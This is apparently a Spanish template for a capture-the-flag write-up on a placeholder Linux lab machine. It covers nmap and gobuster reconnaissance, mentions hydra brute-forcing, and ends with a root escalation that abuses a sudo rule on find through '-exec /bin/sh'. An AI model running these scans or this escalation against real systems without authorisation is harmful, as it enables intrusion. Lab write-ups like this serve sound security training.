---
title: NombreMaquina
platform: DockerLabs # DockerLabs, HackTheBox, TryHackMe, VulnHub...
os: Linux # Linux o Windows
difficulty: Fácil # Muy fácil, Fácil, Media, Difícil, Insane
ip: 10.10.10.X
services: 22/tcp (SSH), 80/tcp (HTTP)
hops: 2 # Número de usuarios / saltos hasta root
tags: [Nmap, Web, Hydra, Sudo, GTFOBins]
description: Resumen breve en una sola línea del vector de entrada y la escalada de privilegios.
---

## Fase 1: Reconocimiento
nmap · escaneo de servicios

Comenzamos realizando un escaneo de puertos sobre la máquina objetivo.

```terminal [nmap]
$ nmap -sCV -sS -p- --open -n -Pn 10.10.10.X
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache httpd 2.4.52
```

## Fase 2: Enumeración web
gobuster · directorios ocultos

Buscamos rutas y directorios ocultos en el servidor web.

```terminal [gobuster]
$ gobuster dir -u http://10.10.10.X -w /usr/share/wordlists/dirb/common.txt
/admin (Status: 200)
/backup (Status: 301)
```

## Fase 3: Explotación y acceso inicial
hydra · fuerza bruta

Obtenemos credenciales válidas y accedemos por SSH.

```terminal [acceso]
$ ssh usuario@10.10.10.X
usuario@maquina:~$ whoami
usuario
```

## Fase 4: Escalada de privilegios {root}
usuario → root

Revisamos permisos de sudo:

```terminal [sudo -l]
usuario@maquina:~$ sudo -l
Matching Defaults entries for usuario on maquina:
    env_reset, mail_badpass

User usuario may run the following commands on maquina:
    (ALL : ALL) NOPASSWD: /usr/bin/find
```

> [!NOTE] GTFOBins · find
> El binario find con privilegios de sudo permite ejecutar comandos directamente abusando del parámetro `-exec`.

```terminal [escalada a root]
usuario@maquina:~$ sudo find . -exec /bin/sh \; -quit
# whoami
root
```

:::flag
¡Máquina completada! Acceso conseguido como root.
uid=0(root)
:::
